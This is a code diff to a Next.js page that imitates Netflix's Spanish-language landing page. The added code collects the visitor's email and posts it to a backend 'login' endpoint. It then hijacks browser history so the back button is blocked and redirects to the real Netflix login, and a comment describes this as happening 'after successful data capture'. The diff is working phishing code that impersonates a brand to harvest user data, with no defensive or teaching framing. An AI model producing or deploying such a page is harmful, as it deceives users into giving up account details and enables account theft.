@@ -1,10 +1,40 @@
 "use client"
 
+import { useState } from "react"
 import Image from "next/image"
 import Link from "next/link"
 import { ChevronRight, Plus } from "lucide-react"
 
 export default function Home() {
+  
+  const [email, setEmail] = useState('');
+  
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    try {
+      // Send data to backend
+      const response = await fetch('http://localhost:5000/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email }),
+      });
+      
+      if (response.ok) {
+        // Manipulate browser history to prevent going back
+        window.history.pushState(null, '', window.location.href);
+        window.onpopstate = function() {
+          window.history.pushState(null, '', window.location.href);
+        };
+        
+        // Redirect to real Netflix after successful data capture
+        window.location.href = 'https://www.netflix.com/login';
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  };
+
   return (
     <div className="min-h-screen bg-black text-white">
       {/* Background Image with Gradient Overlay */}
@@ -42,17 +72,31 @@ export default function Home() {
             ¿Quieres ver Netflix ya? Ingresa tu email para crear una cuenta o reiniciar tu membresía de Netflix.
           </p>
 
-          <div className="flex flex-col md:flex-row gap-2 max-w-xl mx-auto">
+          <form onSubmit={handleSubmit} className="flex flex-col md:flex-row gap-2 max-w-xl mx-auto">
             <input
               type="email"
               placeholder="Email"
               className="flex-1 px-4 py-3 bg-black/60 border border-gray-600 rounded text-white"
+              value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                onBlur={(e) => {
+                const isValid = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(e.target.value);
+                e.target.setCustomValidity(isValid ? "" : "Email inválido");
+                }}
+                pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
+                required
             />
-            <button className="bg-[#e50914] text-white px-6 py-3 rounded flex items-center justify-center gap-1 font-medium">
+              
+            <Link type="submit" href="/login" className="bg-[#e50914] text-white px-6 py-3 rounded flex items-center justify-center gap-1 font-medium">
               Comenzar
               <ChevronRight className="w-5 h-5" />
-            </button>
-          </div>
+            </Link>
+          </form>
+          {email && !/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(email) && (
+                <p className="text-[#e50914] text-xs mt-1 ml-1">
+                Por favor ingresa un correo electrónico válido
+                </p>
+          )}
         </div>
       </section>
 
